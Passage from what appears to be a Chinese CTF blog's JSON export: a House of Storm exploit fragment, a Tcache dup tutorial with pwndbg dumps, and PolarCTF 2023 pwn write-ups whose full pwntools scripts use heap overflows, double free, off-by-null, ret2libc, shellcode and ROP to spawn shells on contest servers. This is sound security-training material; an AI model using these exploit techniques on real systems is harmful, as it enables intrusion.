成功将申请到了heaparray附近 #-----------------------泄漏 libc----------------------------------##由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #修改了r0~r4为0，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是0#dbg() payload = p64(0)*3 +p64(0x13377331)  #满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #满足show的条件#dbg()show(1)  #我们刚刚house of storm 写的地址泄漏出来ru(\"]: \")heap = u64(r(6).ljust(8, '\\x00'))success(\"heap:\"+hex(heap))#dbg()payload  = p64(0)*3 + p64(0x13377331)#满足show的条件payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)#dbg()show(1) #泄漏libc地址ru(\"]: \")malloc_hook = u64(r(6).ljust(8, '\\x00')) -0x58 - 0x10libc_base = malloc_hook - libc.sym['__malloc_hook']free_hook = libc_base+libc.sym['__free_hook']system = libc_base+ libc.sym['system']success(\"free_hook:\"+hex(free_hook)) #--------------修改 free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += '/bin/sh\\x00'edit(0, payload)#dbg()edit(0, p64(system))free(1)itr()\n\n参考文章\nHouse of storm 原理及利用\nLargebin Attack\nCTF-WIKI\nLargebin attack总结\n\n","categories":["heap"],"tags":["House of 系列"]},{"title":"Tcache Attack中的Tcache dup（基础）","url":"/2023/09/15/Tcache%20Attack%E7%9A%84Tcache%20dup/","content":"Tcache Attack中的Tcache dup（基础）\n\n参考资料：CTF-wiki：https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/#tcache-dup\n代码汉化：@yichen：https://www.yuque.com/hxfqg9/bin/qlry85#g5z3g\n附件：\n链接: https://pan.baidu.com/s/1X6PqMvKMTbeIlrv00FelAA  密码: u7pc\n–来自百度网盘超级会员V3的分享\n\n漏洞原理\n\n这里使用libc-2.27.so的源码进行分析\n\nTcache dup利用的是tcache_put()函数的不严谨：\n#代码第2923-2933行：/* Caller must ensure that we know tc_idx is valid and there's room   for more chunks.  */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}\n从上面的代码可以看出，在libc-2.27版本中没有对tcache_put函数进行检查，甚至没有对tcache-&gt;counts[tc_idx] 的检查，在大幅度提高性能的同时安全性也下降来许多。\n因为在这个函数中没有任何的检查，所以我们可以直接对同一个chunk进行多次free，造成cyclical list。\n\nTcache dup类似于之前fastbin_attack中的double free，但是后者的检查要更多。\n\nDemo\n接下来我们使用一个demo来进行说明。\n//gcc -g -fno-stack-protector -z execstack -no-pie -z norelro test.c -o test#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, \"先申请一块内存\\n\");    int *a = malloc(8);    fprintf(stderr, \"申请的内存地址是: %p\\n\", a);    fprintf(stderr, \"对这块内存地址 free两次\\n\");    free(a);    free(a);    fprintf(stderr, \"这时候链表是这样的 [ %p, %p ].\\n\", a, a);    fprintf(stderr, \"接下来再去 malloc 两次: [ %p, %p ].\\n\", malloc(8), malloc(8));    fprintf(stderr, \"Finish!!!\\n\");    return 0;}\n编译完成之后，使用pwndbg调试程序，首先对代码的第12行下断点，然后开始调试程序，此时的内存状况如下：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x601250Size: 0x21Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct......(省略内容均为空)0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000000000\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......(省略内容均为空)0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; bintcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x0000000000000000    \t\t\t\t\t\t\t#指向top_chunk0x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; \n由于在tcache_put函数中没有对堆块进行检查，接下来我们对malloc出的chunk进行多次free。\n对代码的第15行下断点，继续调试：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct0x601010:\t0x0000000000000002\t0x0000000000000000    \t\t#count=20x601020:\t0x0000000000000000\t0x00000000000000000x601030:\t0x0000000000000000\t0x00000000000000000x601040:\t0x0000000000000000\t0x00000000000000000x601050:\t0x0000000000601260\t0x0000000000000000    \t\t#指向chunk1_data......(省略内容均为空)0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000601260\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......(省略内容均为空)0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; bintcachebins0x20 [  2]: 0x601260 ◂— 0x601260fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x0000000000000000    \t\t\t\t\t\t\t#指向top_chunk0x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; \n从上面的内存中可以看出，对chunk1进行两次free之后，在tcache中形成了cyclical list，也就是说chunk1中的next指针指向其本身的chunk_data。\n由于接下来有两次malloc，因此先来看第一次malloc之后的内存，对malloc下断点：\n命令：b malloc\n继续调试程序，由于对malloc下断点，因此程序会停在malloc的push rbp，也就是说程序并没有进行第一次malloc，因此我们输入c继续运行程序，结果如下：\npwndbg&gt; heapFree chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; bintcachebins0x20 [  1]: 0x601260 ◂— 0x601260fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct0x601010:\t0x0000000000000001\t0x0000000000000000    \t\t#count=10x601020:\t0x0000000000000000\t0x00000000000000000x601030:\t0x0000000000000000\t0x00000000000000000x601040:\t0x0000000000000000\t0x00000000000000000x601050:\t0x0000000000601260\t0x0000000000000000......（省略内容均为空）0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000601260\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......（省略内容均为空）0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; bintcachebins0x20 [  1]: 0x601260 ◂— 0x601260fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x0000000000000000    \t\t\t\t\t\t\t#指向top_chunk0x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; \n为了防止程序跑飞，接下来对代码的第17行下断点，看一下第二次malloc之后的结果：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x601000Size: 0x251Free chunk (tcache) | PREV_INUSEAddr: 0x601250Size: 0x21fd: 0x601260Top chunk | PREV_INUSEAddr: 0x601270Size: 0x20d91pwndbg&gt; bintcachebins0x20 [  0]: 0x601260 ◂— ...fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbinsemptylargebinsemptypwndbg&gt; x/16gx &amp;main_arena0x7ffff7dcfc40 &lt;main_arena&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc50 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc60 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc70 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc80 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfc90 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dcfca0 &lt;main_arena+96&gt;:\t0x0000000000601270\t0x00000000000000000x7ffff7dcfcb0 &lt;main_arena+112&gt;:\t0x00007ffff7dcfca0\t0x00007ffff7dcfca0pwndbg&gt; x/100gx 0x6010000x601000:\t0x0000000000000000\t0x0000000000000251 #tcache_perthread_struct 0x601010:\t0x0000000000000000\t0x00000000000000000x601020:\t0x0000000000000000\t0x00000000000000000x601030:\t0x0000000000000000\t0x00000000000000000x601040:\t0x0000000000000000\t0x00000000000000000x601050:\t0x0000000000601260\t0x0000000000000000    \t\t#执行chunk1_data......(省略内容均为空)0x601250:\t0x0000000000000000\t0x0000000000000021 #chunk10x601260:\t0x0000000000601260\t0x00000000000000000x601270:\t0x0000000000000000\t0x0000000000020d91 #top_chunk......(省略内容均为空) 0x601310:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n上面就是tcache_dup的攻击方式，看起来好像没有什么用，下篇文章中的例子会体现。\n","categories":["heap"],"tags":["Tcache bin Attack"]},{"title":"PolarCTF_2023_wp","url":"/2023/09/27/PolarCTF_2023_wp/","content":"PWN\n\n记录一下 一次比赛的复盘，除了夕阳下的舞者有点难度之外，其他题目难度还适中，最后也是拿到了不错的排名！期待12月份的Polar D&amp;N的冬季赛！\n\n\n最后每道题目都有官方视频讲解，链接 【PWN】小狗汪汪汪_哔哩哔哩_bilibili\nemo_chunk\n程序保护\nArch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n解题思路\n\n堆溢出，可以通过溢出chunk内容，从而修改下一个chunk的size字段，制造堆块重叠，将下一个chunk大小改为small chunk，这样free掉之后，会放入unsortedbin中，fd和bk都指向main_arena_88\n然后可以通过打印函数泄露libc地址\n利用fastbin的特性，向malloc_hook-0x23的位置申请chunk，覆写malloc_hook\n\n\n注意一般思路是这样的，但是题目具体要使用realloc_hook来进行调栈，具体操作为改realloc_hook为onegadget，malloc_hook为realloc_hook，这样执行malloc时，会实现二级跳。malloc_hook -&gt; realloc_hook -&gt; onegadget\n\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *#p = remote('123.60.135.228',2094)context(log_level = 'debug', os = 'linux', arch = 'amd64')def connect():    global p,elf,libc    p = process('./emo_chunk')    #p = remote('123.60.135.228',2064)    elf = ELF('./emo_chunk')    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def cmd(xuhao):    p.recvuntil('Please Choice!\\n')    p.sendline(xuhao)def add(size):    cmd(\"1\")    p.recvuntil('Please Input Size:\\n')    p.sendline(str(size))def delete(index):    cmd(\"2\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def edit(index,content):    cmd(\"3\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))    p.recvuntil('Change EMo Content\\n')    p.send(content)def show(index):    cmd(\"4\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def exit():    cmd(\"5\")def debug():    gdb.attach(p)    pause()def pwn(i,j):    heaparray = 0x6020E0    backdoor = 0x400946    free_got = elf.got['free']    #创建几个chunk    add(0x68) #0    add(0x68) #1    add(0x68) #2    add(0x68) #3    add(0x68) #4    add(0x68) #5 隔离top chunk    #泄露libc    edit(0,'a'*0x68 + '\\xe1' + '\\x00'*7)    delete(1)    #debug()    add(0x68) #1    show(2)    libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 0x3c4b78    print(\"libc_base -&gt; \",hex(libc_base))    #计算地址    malloc_hook = libc_base + libc.sym['__malloc_hook']    realloc = libc_base + libc.sym['realloc']    one = [0x45226,0x4527a,0xf03a4,0xf1247]    one_gadget = libc_base + one[i]    delete(4)    edit(3,'a'*0x68 + p64(0x71) + p64(malloc_hook - 0x23))    #debug()    add(0x68) #4    add(0x68) #malloc 6    #思路1,将malloc_hook改成one_gadget，但是打不通    #payload = 'a'*(0x23-0x10) + p64(one_gadget)    #思路2,将realloc_hook改成one_gadget,调栈    #payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc + j) #将malloc_hook修改成realloc_hook    #思路3,题目有后门,直接改malloc_hook为后门函数    payload = 'a'*(0x23-0x10) + p64(backdoor)    edit(6,payload)    add(0x68)    p.interactive()# for i in range(4):#     for j in [2,4,6,8,10]:#         try:#             print(\"i :\",i)#             print(\"j :\",j)#             p = process('./emo_chunk')#             pwn(i,int(j))#         except:#             p.close()#注释为暴力调栈,得出i = 1, j = 8connect()pwn(1,8)'''0x45226\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  rax == NULL0x4527a\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4\texecve(\"/bin/sh\", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247\texecve(\"/bin/sh\", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''\ndouble  free\n程序保护\nArch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n解题思路\ndouble free 可以申请任何我们想要的地址的一个chunk，进而修改内容，本题目就是修改bss段上的值为固定值，进而getshell，具体做法就是申请2个chunk，制造double ，free，形成chunk 1 -&gt; chunk 2 &lt;- chunk 1，修改chunk 1 的指向为目标地址，然后通过连续的malloc 4次，既可申请到目标地址，最后修改chunk内容即可\nexp\n#!/usr/bin/env python# coding=utf-8from pwn import *context(os='linux', arch='amd64', log_level='debug')p = process('./heap_Double_Free')#p = remote('123.60.135.228',2133)def cmd(xuhao):    p.recvuntil('root@ubuntu:~/Desktop$ ')    p.sendline(xuhao)def create(id,size,content):    cmd(\"1\")    p.recvuntil('please input id and size :\\n')    p.sendline(str(id))    p.sendline(str(size))    p.sendline(content)def free(id):    cmd(\"2\")    p.sendline(str(id))def show(id):    cmd(\"3\")    p.sendline(str(id))def getshell():    cmd(\"4\")def debug():    gdb.attach(p)goal = 0x6010b0 #将这里的值改为 257fd = 0x6010b0create(0,0x68,'aaaa') #0create(1,0x68,'bbbb') #1#create(2,16,'cccc') #2 防止和topchunk合并#debug()#double freefree(0)free(1)free(0)#debug()create(3,0x68,p64(goal-0x10)) #3create(4,0x68,'aaaa') #4create(5,0x68,'aaaa') #5#debug()create(6,0x68,p64(0x101)) #6debug()getshell()p.interactive()\neasychunk\n程序保护\nArch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n解题思路\noffbynull\n\n申请4个chunk，free掉chunk 0。然后编辑chunk1，覆写chunk2的prev_size为chunk0 + chun1，size低位为0，表示前面的chunk为free chunk\nchunk 0 chunk 1 会合并，但是 chunk 1 始终存在，合并后放入了unsorted bin 中，申请一个同样大小的chunk 5收回chunk0，这样chunk 1的fd 和bk都是main_arena_88，泄露libc地址\n最后通过fastbin向malloc_hook-0x23申请地址，最后修改malloc_hook 为 og\n\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *#p = remote('123.60.135.228',2094)context(log_level = 'debug', os = 'linux', arch = 'amd64')def connect():    global p,elf,libc    local = 0    if local:        p = process('./easychunk')    else:        p = remote('123.60.135.228',2114)    elf = ELF('./easychunk')    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def cmd(xuhao):    p.recvuntil('Please Choice!\\n')    p.sendline(xuhao)def add(size,content):    cmd(\"1\")    p.recvuntil('Please give me a name for item:\\n')    p.sendline('aaaa')    p.recvuntil('Please Input Size:\\n')    p.sendline(str(size))    p.recvuntil('Content of Emo!:\\n')    p.send(content)def delete(index):    cmd(\"2\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def edit(index,content):    cmd(\"3\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))    p.recvuntil('Change EMo Content\\n')    p.send(content)def show(index):    cmd(\"4\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def exit():    cmd(\"5\")def debug():    gdb.attach(p)    pause()def pwn():    dem = \"hello,everyone.Welcome to:Polar D&amp;N:\"    p.recvuntil('Where are you from?\\n')    p.sendline(dem)    #申请几个chunk    add(0xf8,\"aaaa\") #0    add(0xf8,\"bbbb\") #1    add(0xf8,\"cccc\") #2    add(0xf8,\"dddd\") #3    #free掉chunk0    delete(0) #0    #通过编辑chunk1溢出chunk2的size的inues位为0,注意chunk2的prevsize位为chunk0size+chunk2size    pay0 = 'a'*0xf0 + p64(0x200)    edit(1,pay0)    delete(2) #2    #泄露libc    add(0xf8,\"aaaa\") #0    show(1)    p.recvuntil('content:\\n')    main_arena = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))    #print(\"main_arena88\",hex(main_arena))    libc_base = main_arena - 0x3c4b78    print(\"libc_base\", hex(libc_base))    malloc_hook = libc_base + libc.sym['__malloc_hook']    realloc_hook = libc_base + libc.sym['realloc']    one = [0x45226,0x4527a,0xf03a4,0xf1247]    one_gadget = libc_base + one[1]    #修改chunk1的fd改为malloc_hook - 0x23    add(0x68,b'aaa') #2-&gt;1    delete(2)    edit(1,p64(malloc_hook-0x23))    add(0x68,'aaaa') #2    payload = 'a'*(0x23-0x10-0x8) + p64(one_gadget) + p64(realloc_hook+8)    #debug()    add(0x68,payload)    cmd(\"1\")    p.recvuntil('Please give me a name for item:\\n')    p.sendline('aaaa')    p.interactive()connect()pwn()# for i in range(4):#     for j in [2,4,6,8,10]:#         try:#             print(\"i :\",i)#             print(\"j :\",j)#             p = process('./emo_chunk')#             pwn(i,int(j))#         except:#             p.close()#注释为暴力调栈,得出i = 1, j = 8'''0x45226\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  rax == NULL0x4527a\texecve(\"/bin/sh\", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf03a4\texecve(\"/bin/sh\", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1247\texecve(\"/bin/sh\", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL'''\nfish\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n解题思路\n函数存在gets，溢出控制返回地址为bss段上再执行一次gets。直接溢出输入system(“/bin/sh”)\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearcherp = remote('123.60.135.228',2060)#p = process('./fish')context(log_level = 'debug', os = 'linux', arch = 'i386')elf = ELF('./fish')sys = elf.plt['system']print(hex(sys))get_plt = elf.plt['gets']print(hex(get_plt))puts_plt = elf.plt['puts']puts_got = elf.got['puts']bss = 0x0804A040p.sendline(\"123\")payload = b'a'*0x112 + p32(get_plt) + p32(sys) + p32(bss) + p32(bss)p.recvuntil(b'How many fish does the kitten eat\\n')p.sendline(payload)p.sendline(b'/bin/sh')p.interactive()\nformat_ret2libc\n程序保护\nArch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n解题思路\nret2libc\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2107)#p = process('./format_ret2libc')context(log_level = 'debug', os = 'linux', arch = 'amd64')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')elf = ELF('./format_ret2libc')puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]vuln_addr = 0x40084Bpop_rdi_ret = 0x0000000000400943payload1 = \"%39$p\"#p.recvuntil(\"Say some words\\n\")p.sendline(payload1)p.recvuntil(\"0x\")canary = int(p.recv(16), 16)print(hex(canary))payload2 = b\"a\" * (0x70-8) + p64(canary) + b\"a\" * 8payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)p.sendlineafter(\"What's your name?\\n\", payload2)puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))log.info(\"puts_addr -&gt; %x\",puts_addr)# libcbase = puts_addr - libc.symbols['puts']# system_addr = libcbase + libc.symbols['system']# binsh_addr = libcbase + next(libc.search(\"/bin/sh\"))# libc = LibcSearcher('puts', puts_addr)# libcbase = puts_addr - libc.dump('puts')# system_addr = libcbase + libc.dump('system')# binsh_addr = libcbase + libc.dump('str_bin_sh')libc = puts_addr - \t0x06f6a0system_addr = libc + 0x0453a0binsh_addr = libc + 0x18ce57payload3 = b\"a\" * (0x70-8) + p64(canary) + b\"a\" * 8payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)p.sendlineafter(\"What's your name?\\n\", payload3)p.interactive()\nGame\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n解题思路\nret2libc\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearchercontext(log_level = 'debug', os = 'linux', arch = 'amd64')p = remote('123.60.135.228',2064)#p = process('./Game')elf = ELF('./Game')puts_plt = elf.plt['puts']puts_got = elf.got['puts']main_addr = elf.symbols['main']start = 0x080485F4offset = 0x64 + 8 + 4p.recvuntil('Do you play game?\\n')p.sendline(\"yes\")p.recvuntil('Do you think playing games will affect your learning?\\n')p.sendline(\"yes\")p.recvuntil(\"I think the same as you!\\n\")payload = b'a'*offset + p32(puts_plt) + p32(start) + p32(puts_got)#payload = p32(puts_got)#gdb.attach(p)p.sendline(payload)p.recvuntil('\\n')puts_addr = u32(p.recv()[0:4])log.info('puts -&gt; %x',puts_addr)# libc = LibcSearcher('puts', puts_addr)# libcbase = puts_addr - libc.dump('puts')# system_addr = libcbase + libc.dump('system')# binsh_addr = libcbase + libc.dump('str_bin_sh')libc = puts_addr - 0x05f150system_addr = libc + 0x03a950binsh_addr = libc + 0x15912bp.recvuntil(\"I think the same as you!\\n\")payload2 = b'a'* offset + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)p.sendline(payload2)p.interactive()\nname4\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n解题思路\n绕过检查的shellcode\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2116)#p = process('./name4')context(log_level = 'debug', os = 'linux', arch = 'i386')elf = ELF('./name4')shellcode = asm(shellcraft.sh())p.recvuntil(\"Enter your name:\\n\")p.sendline('\\x00'+shellcode)goal = 0x0804A0E0goal1 = 0x0804A080 + 1p.recvuntil('Enter your best friend name:\\n')p.sendline(shellcode)p.recvuntil('give you stack overflow:\\n')payload = 'a'*0x20 + p32(0xdeadbeff) + p32(goal)#gdb.attach(p)p.sendline(payload)p.interactive()\nplay\n程序保护\nArch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x400000)    RWX:      Has RWX segments\n解题思路\n通过往bss段上写shellcode再跳转执行\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *p = remote('123.60.135.228',2063)#p = process('./play')context(log_level = 'debug', os = 'linux', arch = 'amd64')elf = ELF('./play')shellcode = asm(shellcraft.sh())p.recvuntil(\"I think you must enjoy playing.\\n\")p.sendline(shellcode)goal = 0x6010A0p.recvuntil('Name your favorite game?\\n')payload = b'a'*(0x30+8) + p64(goal)#gdb.attach(p)p.sendline(payload)p.interactive()\nret2syscall\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments\n解题思路\nret2syscall 32位的执行 (0xb，0，0，binsh) 再调用80号中断\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import LibcSearcherp = remote('123.60.135.228',2109)#p = process('./ret2syscall_32')context(log_level = 'debug', os = 'linux', arch = 'i386')elf = ELF('./ret2syscall_32')offset = 0x208 + 4binsh_addr = 0x080EA068pop_eax = 0x080b8576pop_edx_ecx_ebx = 0x0806f250int80_addr = 0x0806cea3payload = b'a'*offset + p32(pop_eax) + p32(0xb)payload += p32(pop_edx_ecx_ebx) + p32(0x0) + p32(0x0) + p32(binsh_addr) + p32(int80_addr)p.sendline(payload)p.interactive()\nsleep\n程序保护\nArch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n解题思路\nret2libc\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2057)#p = process('./sleep')context(log_level = 'debug', os = 'linux', arch = 'amd64')#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')elf = ELF('./sleep')puts_got = elf.got[\"puts\"]puts_plt = elf.plt[\"puts\"]vuln_addr = 0x4006BDpop_rdi_ret = 0x0000000000400783payload2 = b\"a\" * (0x70+8)payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)p.sendlineafter(\"Please cherish every second of sleeping time !!!\\n\", payload2)puts_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00'))log.info(\"puts_addr -&gt; %x\",puts_addr)# libcbase = puts_addr - libc.symbols['puts']# system_addr = libcbase + libc.symbols['system']# binsh_addr = libcbase + next(libc.search(\"/bin/sh\"))# libc = LibcSearcher('puts', puts_addr)# libcbase = puts_addr - libc.dump('puts')# system_addr = libcbase + libc.dump('system')# binsh_addr = libcbase + libc.dump('str_bin_sh')libc = puts_addr - \t0x06f6a0system_addr = libc + 0x0453a0binsh_addr = libc + 0x18ce57payload3 = b\"a\" * (0x70+8)payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)p.sendlineafter(\"Please cherish every second of sleeping time !!!\\n\", payload3)p.interactive()\nstackpivot_x86\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n解题思路\n栈迁移蛮有意思的，结构b’a’*padding + p64(goal) + p64(leave_ret)，通过执行两次 leave ; ret 将栈迁移到目标位置\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *#p = remote('123.60.135.228',2131)p = process('./stack_pivotingx86')context(log_level = 'debug', os = 'linux', arch = 'i386')binsh = 0x0804A030system_addr = 0x08048579leave_ret = 